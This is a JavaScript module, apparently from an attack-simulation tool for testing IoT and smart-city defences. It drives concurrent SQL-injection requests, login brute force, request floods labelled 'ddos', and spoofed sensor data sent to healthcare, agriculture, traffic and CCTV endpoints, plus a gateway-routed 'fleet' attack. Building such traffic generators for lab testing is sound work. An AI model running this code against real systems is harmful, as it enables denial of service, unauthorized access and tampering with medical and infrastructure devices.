import { getSqlPayload, getCctvAttackType, getAttackPayload } from './payloads'

/**
 * Execute a direct-mode attack against a target.
 * Returns { successCount, failCount, totalSent }
 */
export async function runDirectAttack({
  type,
  target,
  deviceId,
  reqCount,
  concurrency,
  onProgress,
  onLog,
  shouldStopRef,
}) {
  let successCount = 0
  let failCount = 0
  let completed = 0

  const worker = async () => {
    while (completed < reqCount && !shouldStopRef.current) {
      completed++
      const currentId = completed

      try {
        let res

        if (type === 'sql') {
          const payload = getSqlPayload(currentId)
          res = await fetch(`${target}/data`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ query: payload }),
          })
        } else if (type === 'brute') {
          res = await fetch(`${target}/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: `admin_${currentId}`, password: `pass${Math.random()}` }),
          })
        } else if (type === 'ddos') {
          res = await fetch(`${target}/?t=${Date.now()}_${currentId}`)
        } else if (type === 'scan') {
          await new Promise((r) => setTimeout(r, 50))
          res = { ok: Math.random() > 0.8 }
        } else if (type === 'healthcare') {
          res = await fetch(`${target}/iomt`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              domain: 'healthcare',
              device_id: deviceId,
              sensor_data: [
                Math.random() * 5000 + 1000,
                Math.floor(Math.random() * 500) + 100,
                Math.random() * 100 + 50,
                Math.random() * 80 + 40,
              ],
            }),
          })
        } else if (type === 'agriculture') {
          res = await fetch(`${target}/sensors`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              domain: 'agriculture',
              device_id: deviceId,
              sensor_data: [
                Math.floor(Math.random() * 50) + 50,
                Math.floor(Math.random() * 10),
                Math.floor(Math.random() * 20),
                Math.floor(Math.random() * 255),
                Math.floor(Math.random() * 255),
                Math.floor(Math.random() * 255),
              ],
            }),
          })
        } else if (type === 'urban') {
          res = await fetch(`${target}/traffic`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              domain: 'urban',
              device_id: deviceId,
              sensor_data: [0, 0],
            }),
          })
        } else if (type === 'cctv') {
          const attackType = getCctvAttackType(currentId)
          res = await fetch(`${target}/cctv`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              domain: 'urban',
              device_id: deviceId,
              attack_type: attackType,
            }),
          })
        }

        if (res && res.ok) successCount++
        else failCount++
      } catch {
        failCount++
      }

      if (currentId % 20 === 0) {
        onProgress?.(currentId, reqCount)
      }
    }
  }

  const workers = Array.from({ length: concurrency }, () => worker())
  await Promise.all(workers)

  return { successCount, failCount, totalSent: completed }
}

/**
 * Execute a fleet-mode attack routed through the API Gateway.
 */
export async function runFleetAttack({ gatewayUrl, targetSector, type }) {
  const res = await fetch(`${gatewayUrl}/attack`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      sector: targetSector,
      attack_type: type,
      payload: getAttackPayload(type),
    }),
  })
  return res.json()
}
